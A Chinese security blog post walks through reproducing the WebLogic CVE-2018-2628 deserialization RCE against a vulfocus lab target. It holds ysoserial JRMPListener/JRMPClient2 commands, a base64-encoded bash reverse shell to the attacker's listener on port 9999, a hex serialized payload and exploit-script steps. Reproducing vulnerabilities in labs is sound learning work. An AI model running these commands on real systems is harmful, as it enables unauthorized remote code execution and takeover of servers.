<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>CVE-2018-2628漏洞复现 | wanfer&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="1、漏洞描述Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过T3协议触发，可导致未授权的用户在远程服务器执行任意命令 2、漏洞影响版本1234Weblogic 10.3.6.0Weblogic 12.1.3.0Weblogic 12.2.1.2Weblogic 12.2.1.3">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2018-2628漏洞复现">
<meta property="og:url" content="https://wanfer0.github.io/2024/10/31/CVE-2018-2628%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="wanfer&#39;s blog">
<meta property="og:description" content="1、漏洞描述Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过T3协议触发，可导致未授权的用户在远程服务器执行任意命令 2、漏洞影响版本1234Weblogic 10.3.6.0Weblogic 12.1.3.0Weblogic 12.2.1.2Weblogic 12.2.1.3">
<meta property="og:locale">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950225.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953323.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953256.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950282.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950430.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953122.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950214.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953159.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950173.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953577.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051956675.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953171.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051956597.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950538.png">
<meta property="article:published_time" content="2024-10-31T10:01:38.000Z">
<meta property="article:modified_time" content="2024-11-05T12:16:49.296Z">
<meta property="article:author" content="wanfer">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950225.png">
  
    <link rel="alternate" href="/atom.xml" title="wanfer's blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">wanfer&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">网络安全技术分享</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://wanfer0.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-CVE-2018-2628漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/31/CVE-2018-2628%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2024-10-31T10:01:38.000Z" itemprop="datePublished">2024-10-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      CVE-2018-2628漏洞复现
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a><strong>1、漏洞描述</strong></h3><p>Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过T3协议触发，可导致未授权的用户在远程服务器执行任意命令</p>
<h3 id="2、漏洞影响版本"><a href="#2、漏洞影响版本" class="headerlink" title="2、漏洞影响版本"></a><strong>2、漏洞影响版本</strong></h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Weblogic 10.3.6.0</span><br><span class="line">Weblogic 12.1.3.0</span><br><span class="line">Weblogic 12.2.1.2</span><br><span class="line">Weblogic 12.2.1.3</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="3、漏洞成因"><a href="#3、漏洞成因" class="headerlink" title="3、漏洞成因"></a><strong>3、漏洞成因</strong></h3><p>攻击者利用RMI绕过weblogic黑名单限制，将加载的内容利用readObject解析，造成反序列化漏洞，该漏洞主要由于T3协议触发，所有开放weblogic控制台7001端口，默认开启T3服务，攻击者发送构造好的T3协议数据，获取目标服务器的权限。</p>
<p>RMI：Java 的一组拥护开发分布式应用程序的 API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是 1099 端口。</p>
<p>java反序列化：指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
<p>T3协议：WebLogic Server 中的 RMI（远程方法调用） 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。</p>
<p>攻击过程：在自己主机中启动 JRMP Server服务并且开启监听，利用JRMP Client 生成一段payload payload中已经设置了攻击者服务器ip及JRMPListener监听的端口 ，利用漏洞exp脚本，将payload发送到有漏洞的weblogic服务器中 ，weblogic服务器接收到payload后，反序列化payload，去连接JRMP Server服务器，两者建立通讯，建立通讯后，JRMP Server服务会发送一段可执行命令的payload ，从而达到任意代码执行的操作</p>
<h3 id="JRMP服务介绍"><a href="#JRMP服务介绍" class="headerlink" title="JRMP服务介绍"></a><strong>JRMP服务介绍</strong></h3><p>JRMP Server服务是指Java远程消息交换协议（Java Remote Message Protocol，简称JRMP）的服务器端实现。JRMP是Java技术中用于查找和引用远程对象的协议，它运行在Java远程方法调用（RMI）之下、TCP&#x2F;IP之上的线路层协议。JRMP协议规定了客户端和服务端在RMI过程中通信要满足的规范，它负责组织数据格式并通过TCP进行传输，以实现远程方法调用</p>
<ul>
<li><p><strong>监听和接受连接</strong>：JRMP Server服务会在指定端口开启监听，等待客户端的连接请求</p>
</li>
<li><p><strong>应答请求</strong>：对于接收到的RMI客户端请求，JRMP Server服务会根据JRMP协议进行应答</p>
</li>
<li><p><strong>数据传输</strong>：JRMP Server服务负责在客户端和服务端之间传输序列化和反序列化的数据</p>
</li>
<li><p><strong>执行远程代码</strong>：在安全漏洞的利用场景中，JRMP Server服务可以被用来发送恶意的反序列化payload，导致连接到该服务的客户端执行任意代码，实现远程代码执行（RCE）攻击</p>
</li>
</ul>
<p>在一些安全漏洞利用中，攻击者会启动一个JRMP Server服务，并设置一个监听端口。然后，利用漏洞将恶意payload发送到目标WebLogic服务器，该服务器在反序列化payload时会连接到攻击者的JRMP Server服务，从而接收并执行攻击者发送的恶意代码。这种攻击方式通常涉及到Java反序列化漏洞，其中JRMP协议被用来绕过安全限制，实现未经授权的远程代码执行</p>
<h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a><strong>二、漏洞复现</strong></h3><p>利用T3协议造成此漏洞 而T3协议是基于RMI协议实现 JRMP协议在Tcp&#x2F;ip层之上，在RMI协议之下，所以RIM的传递时底层使用的是JRMP协议，RMI默认使用JRMP进行传输数据，所以可以利用JRMP服务来复现此漏洞</p>
<p><strong>vulfocus中启动靶场</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950225.png"></p>
<p>&#x2F;console访问登录页面</p>
<p><a target="_blank" rel="noopener" href="http://123.58.224.8:14837/console/login/LoginForm.jsp"><strong>http://123.58.224.8:14837/console/login/LoginForm.jsp</strong></a></p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953323.png"></p>
<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a><strong>漏洞检测</strong></h3><p>利用CVE-2018-2628漏洞工具包检测目标地址是否存在漏洞</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/Lighird/CVE-2018-2628">https://github.com/Lighird/CVE-2018-2628</a></p>
<p>下载exp</p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953256.png"></p>
<p>用法：将需要检测的 ip:port 放入同目录下的url.txt文件中。然后运行：（代码93行处修改线程数）</p>
<p><code>python CVE-2018-2628-MultiThreading.py</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950282.png"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>启动JRMP服务，目的是为了让weblogic服务器远程调用</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener &lt;port&gt; Jdk7u21 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMwLjEzNS85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"></span><br><span class="line">#port为开启JRMP服务的端口号  </span><br><span class="line">#Jdk7u21为机器的jdk版本  如果jdk版本&gt;1.7，则直接填写Jdk7u21即可</span><br><span class="line">#bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMwLjEzNS85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;为反弹shell代码</span><br><span class="line">要进行编码</span><br></pre></td></tr></table></figure>

<p>查看kali的ip</p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950430.png"></p>
<p>监听9999端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953122.png"></p>
<p>编码bash代码 <a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">__ 编码地址__</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950214.png"></p>
<p>这里kali不支持java8了，切换到Windows的java8环境中</p>
<p>开启JRMP服务</p>
<p><code>java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener 42738 Jdk7u21 &quot;bash -c bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMTAuNTAuMTc3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953159.png"></p>
<p>利用ysoserial-0.1-cve-2018-2628-all.jar生成payload</p>
<p>目的是将漏洞服务器和JRMP服务器建立连接</p>
<p><code>java -jar ysoserial-0.1-cve-2018-2628-all.jar JRMPClient2 10.110.50.177:42738 | xxd -p | tr -d $&#39;\n&#39; &amp;&amp; echo</code></p>
<p>这里的Windows的cmd窗口不支持xxd和tr命令</p>
<p>修改一下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.1-cve-2018-2628-all.jar JRMPClient2 10.110.50.177:42738 &gt; temp.txt</span><br><span class="line">certutil -f -encodehex temp.txt temp.hex</span><br><span class="line">del temp.txt</span><br><span class="line">type temp.hex | findstr /v /r &quot;^$&quot;</span><br><span class="line">del temp.hex</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950173.png"></p>
<p>payload如下：</p>
<p>aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707736000a556e6963617374526566000d31302e3131302e35302e3137370000a6f2000000003f020cf500000000000000000000000000000078</p>
<p>替换payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953577.png"></p>
<p>修改漏洞服务器的IP地址和端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051956675.png"></p>
<p>查看端口，一个是JRMP服务一个是9999监听端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051953171.png"></p>
<p>执行exp脚本返回successful！</p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051956597.png"></p>
<p><strong>第二种方法，直接使用工具一把梭</strong></p>
<p>这里用cve-2021-2129梭哈了</p>
<p><img src="https://cdn.jsdelivr.net/gh/wanfer0/picture//test/202411051950538.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wanfer0.github.io/2024/10/31/CVE-2018-2628%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cm34f0mpn0000loj1f4xe4d7b" data-title="CVE-2018-2628漏洞复现" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/11/04/%E5%B0%81%E7%A5%9E%E5%8F%B0-%E7%AC%AC%E4%BA%8C%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Neuer</strong>
      <div class="article-nav-title">
        
          封神台-第二关
        
      </div>
    </a>
  
  
    <a href="/2024/10/30/%E5%B0%81%E7%A5%9E%E5%8F%B0-%E7%AC%AC%E4%B8%80%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Älter</strong>
      <div class="article-nav-title">封神台-第一关</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archiv</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">letzter Beitrag</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/11/04/%E5%B0%81%E7%A5%9E%E5%8F%B0-%E7%AC%AC%E4%BA%8C%E5%85%B3/">封神台-第二关</a>
          </li>
        
          <li>
            <a href="/2024/10/31/CVE-2018-2628%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">CVE-2018-2628漏洞复现</a>
          </li>
        
          <li>
            <a href="/2024/10/30/%E5%B0%81%E7%A5%9E%E5%8F%B0-%E7%AC%AC%E4%B8%80%E5%85%B3/">封神台-第一关</a>
          </li>
        
          <li>
            <a href="/2024/10/29/HTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E(cve-2017-15715)/">HTTPD换行解析漏洞</a>
          </li>
        
          <li>
            <a href="/2024/10/29/xxe%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E6%9C%89%E5%9B%9E%E6%98%BE-%E6%97%A0%E5%9B%9E%E6%98%BE%E6%94%BB%E5%87%BB/">xxe漏洞原理和有回显 无回显攻击</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 wanfer<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>